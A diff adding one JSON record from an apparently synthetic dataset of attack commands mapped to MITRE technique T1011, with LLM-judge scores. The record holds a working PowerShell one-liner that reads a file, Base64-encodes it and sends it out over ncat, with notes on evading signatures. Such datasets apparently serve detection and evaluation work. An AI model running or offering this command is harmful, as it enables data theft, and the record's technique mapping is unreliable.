@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$if=(Get-NetAdapter -Name 'Wi-Fi').ifIndex; $dest=('fe80::a00:27ff:fe4e:66a1%{0}' -f $if); $b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); $b | ncat.exe -6 $dest 59555 --send-only",
+  "explanation": "Exfiltrates to a link-local IPv6 address on the Wi-Fi interface, using a local wireless medium distinct from primary routed channels. Data remains Base64-encoded, aligning with T1011's use of other network media.",
+  "rationale_steps": [
+    "Target a link-local IPv6 address on Wi-Fi to ensure a distinct network path.",
+    "Send Base64 data to an uncommon high TCP port to avoid typical service signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-aa6947e1",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, valid -f formatting, proper variable assignments, and a correctly structured ncat invocation.",
+        "semantic_score": 2,
+        "semantic_justification": "The command plausibly exfiltrates data over a link-local IPv6 network path, but this aligns with network exfiltration rather than the described T1011 physical medium technique.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:17:41.373659Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced parentheses/braces, correct variable assignments, string formatting, and proper method calls.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network interface, it uses IPv6 networking over Wi-Fi rather than a physical medium like USB drives or SD cards as described in T1011, making it misaligned with the specific technique despite being operationally plausible.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:17:44.623549Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax for variable assignment, cmdlet calls, .NET methods, string formatting, and proper `ncat.exe` arguments.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs network exfiltration over a local wireless medium, which is fundamentally misaligned with T1011, 'Exfiltration Over Physical Medium,' which focuses on the physical removal of storage media (e.g., USB drives) containing data, not network transmissions.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:18:10.355061Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
